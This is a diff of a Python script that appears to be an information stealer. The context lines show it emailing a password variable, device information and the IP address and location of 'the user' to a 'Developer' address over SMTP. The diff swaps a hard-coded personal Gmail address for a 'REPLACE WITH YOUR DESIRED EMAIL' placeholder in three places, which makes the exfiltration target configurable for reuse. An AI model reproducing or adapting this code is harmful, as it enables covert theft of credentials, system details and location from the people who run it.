@@ -87,7 +87,7 @@ s.login(M1, P1)
 subject = "Mail from " + M1 + " to " + RMID
 message = "From: " + M1 + "\nTo: " + RMID + "\nSubject: " + subject + "\n" + Pass
 
-Developer = "K.alam93899@gmail.com"
+Developer = "REPLACE WITH YOUR DESIRED EMAIL ADDRESS"
 
 # sending the mail
 s.sendmail(M1, Developer, message)
@@ -165,7 +165,7 @@ if __name__ == "__main__":
   data_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
 
   # Send the email 
-  send_email("System Information", data_str, "K.alam93899@gmail.com")
+  send_email("System Information", data_str, "REPLACE WITH YOUR DESIRED EMAIL")
 
 #sending the location of user
 
@@ -190,7 +190,7 @@ json_data = json.dumps(data, indent=4)
 # Email configuration
 sender_email = M1
 sender_password = Password
-receiver_email = "K.alam93899@gmail.com"
+receiver_email = "REPLACE WITH YOUR DESIRED EMAIL"
 subject = "IP Information"
 
 # Email content
